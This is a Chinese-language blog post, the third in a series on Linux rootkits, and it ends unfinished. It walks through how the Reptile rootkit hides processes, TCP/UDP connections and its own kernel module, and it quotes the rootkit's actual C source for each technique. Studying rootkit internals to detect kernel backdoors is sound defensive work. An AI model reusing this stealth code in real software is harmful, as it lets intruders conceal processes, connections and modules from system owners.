---
layout: post
title:  Linux Rootkit初窥(三)Rootkit隐藏
description: Linux Rootkit初窥(三)Rootkit隐藏
summary: Linux Rootkit初窥(三)Rootkit隐藏
tags: security
minute: 15
---

## 背景

一个良好的 Rootkit 除了有敲门，Hook以外，隐藏网络/进程/内核模块也是十分重要的，同时对于我们分析是否存在内核后门，也非常重要

以下部分代码基于 [Reptile](https://github.com/f0rb1dd3n/Reptile)

## proc 隐藏

[代码地址](https://github.com/f0rb1dd3n/Reptile/blob/master/kernel/proc.c)

### 判断可见

首先是入口地址，判断进程是否可见，再调用 `flag_tasks` 设置

```C
void hide_proc(pid_t pid)
{
	if (is_proc_invisible(pid))
		flag_tasks(pid, 0);
	else
		flag_tasks(pid, 1);
}
```

先看一下 `is_proc_invisible` 函数

```C
int is_proc_invisible(pid_t pid)
{
	struct task_struct *task;
	int ret = 0;

	if (!pid)
		return ret;

	task = find_task(pid);
	if (!task)
		return ret;

	if (is_task_invisible(task))
		ret = 1;

	put_task_struct(task);
	return ret;
}

...

#define FLAG 0x80000000

static inline int is_task_invisible(struct task_struct *task)
{
	return task->flags & FLAG;
}
```

主要判断 `task->flags` 一切围绕着这个展开，包括下面的进程隐藏。我对于 linux 内核并不熟悉，搜索学习了一下如下：

### 进程标记

`task_struct` 这个结构体，在 `linux/sched.h` 下，[elixir](https://elixir.bootlin.com/linux/latest/source/include/linux/sched.h#L728)

对应的 `flags` 标识位如下所示:

```C
/*
 * Per process flags
 */
#define PF_VCPU			0x00000001	/* I'm a virtual CPU */
#define PF_IDLE			0x00000002	/* I am an IDLE thread */
#define PF_EXITING		0x00000004	/* Getting shut down */
#define PF_POSTCOREDUMP		0x00000008	/* Coredumps should ignore this task */
#define PF_IO_WORKER		0x00000010	/* Task is an IO worker */
#define PF_WQ_WORKER		0x00000020	/* I'm a workqueue worker */
#define PF_FORKNOEXEC		0x00000040	/* Forked but didn't exec */
#define PF_MCE_PROCESS		0x00000080      /* Process policy on mce errors */
#define PF_SUPERPRIV		0x00000100	/* Used super-user privileges */
#define PF_DUMPCORE		0x00000200	/* Dumped core */
#define PF_SIGNALED		0x00000400	/* Killed by a signal */
#define PF_MEMALLOC		0x00000800	/* Allocating memory */
#define PF_NPROC_EXCEEDED	0x00001000	/* set_user() noticed that RLIMIT_NPROC was exceeded */
#define PF_USED_MATH		0x00002000	/* If unset the fpu must be initialized before use */
#define PF_NOFREEZE		0x00008000	/* This thread should not be frozen */
#define PF_FROZEN		0x00010000	/* Frozen for system suspend */
#define PF_KSWAPD		0x00020000	/* I am kswapd */
#define PF_MEMALLOC_NOFS	0x00040000	/* All allocation requests will inherit GFP_NOFS */
#define PF_MEMALLOC_NOIO	0x00080000	/* All allocation requests will inherit GFP_NOIO */
#define PF_LOCAL_THROTTLE	0x00100000	/* Throttle writes only against the bdi I write to,
						 * I am cleaning dirty pages from some other bdi. */
#define PF_KTHREAD		0x00200000	/* I am a kernel thread */
#define PF_RANDOMIZE		0x00400000	/* Randomize virtual address space */
#define PF_SWAPWRITE		0x00800000	/* Allowed to write to swap */
#define PF_NO_SETAFFINITY	0x04000000	/* Userland is not allowed to meddle with cpus_mask */
#define PF_MCE_EARLY		0x08000000      /* Early kill for mce process policy */
#define PF_MEMALLOC_PIN		0x10000000	/* Allocation context constrained to zones which allow long term pinning. */
#define PF_FREEZER_SKIP		0x40000000	/* Freezer should not count it as freezable */
#define PF_SUSPEND_TASK		0x80000000      /* This thread called freeze_processes() and should not be frozen */
```

在 `Reptile` 中，判断是否为 `PF_SUSPEND_TASK`. 在[其他项目](https://github.com/seal9055/cyber_attack_simulation/blob/7aff159017ce013fca6b59dd687e221251d57100/rootkit/rootkit.c)中，我们也能看到为 `0x10000000` 即 `PF_MEMALLOC_PIN`

## net 隐藏

[文件地址](https://github.com/f0rb1dd3n/Reptile/blob/1e17bc82ea8e4f9b4eaf15619ed6bcd283ad0e17/kernel/network.c)
[main.c](https://github.com/f0rb1dd3n/Reptile/blob/1e17bc82ea8e4f9b4eaf15619ed6bcd283ad0e17/kernel/main.c)

在 `main.c` 中代码如下：

```C
/* ------------------------ HIDE CONNECTIONS ------------------------- */

#ifdef CONFIG_HIDE_CONN

#include <net/inet_sock.h>
#include <linux/seq_file.h>
#include "network.h"

LIST_HEAD(hidden_conn_list);

KHOOK_EXT(int, tcp4_seq_show, struct seq_file *, void *);
static int khook_tcp4_seq_show(struct seq_file *seq, void *v)
{
	int ret;
	struct sock *sk = v;
	struct inet_sock *inet;
	struct hidden_conn *hc;
	unsigned int daddr;
	//unsigned short dport;

	if (v == SEQ_START_TOKEN) {
		goto origin;
	}

	inet = (struct inet_sock *)sk;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 33)
	daddr = inet->inet_daddr;
	//dport = inet->inet_dport;
#else
	daddr = inet->daddr;
	//dport = inet->dport;
#endif

	list_for_each_entry(hc, &hidden_conn_list, list)
	{
		if (hc->addr.sin_addr.s_addr == daddr /* && hc->addr.sin_port == dport */) {
			ret = 0;
			goto out;
		}
	}
origin:
	ret = KHOOK_ORIGIN(tcp4_seq_show, seq, v);
out:
	return ret;
}

KHOOK_EXT(int, udp4_seq_show, struct seq_file *, void *);
static int khook_udp4_seq_show(struct seq_file *seq, void *v)
{
	int ret;
	struct sock *sk = v;
	struct inet_sock *inet;
	struct hidden_conn *hc;
	unsigned int daddr;
	//unsigned short dport;

	if (v == SEQ_START_TOKEN) {
		goto origin;
	}

	inet = (struct inet_sock *)sk;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 33)
	daddr = inet->inet_daddr;
	//dport = inet->inet_dport;
#else
	daddr = inet->daddr;
	//dport = inet->dport;
#endif

	list_for_each_entry(hc, &hidden_conn_list, list)
	{
		if (hc->addr.sin_addr.s_addr == daddr /* && hc->addr.sin_port == dport */) {
			ret = 0;
			goto out;
		}
	}
origin:
	ret = KHOOK_ORIGIN(udp4_seq_show, seq, v);
out:
	return ret;
}

#endif
```

简单来说就是 hook 掉 `tcp4_seq_show/udp4_seq_show` 这两个展示网络接口。在函数 `khook_inet_ioctl` 分支 4 获取来判断是否隐藏

### module 隐藏

首先 module 的获取是, `/proc/modules` 以及 `lsmod` ，在 `Reptile` 中是将自身从内核模块链表中删除。代码很简单，具体原理放后面再深入

```C
void hide(void)
{
	while (!mutex_trylock(&module_mutex))
		cpu_relax();
	mod_list = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;
	mutex_unlock(&module_mutex);
	
	hide_m = 1;
}
```

### Unfishied

> 稍微流水账的记录了一下... 因为急于看 cilium 的 tetragon...
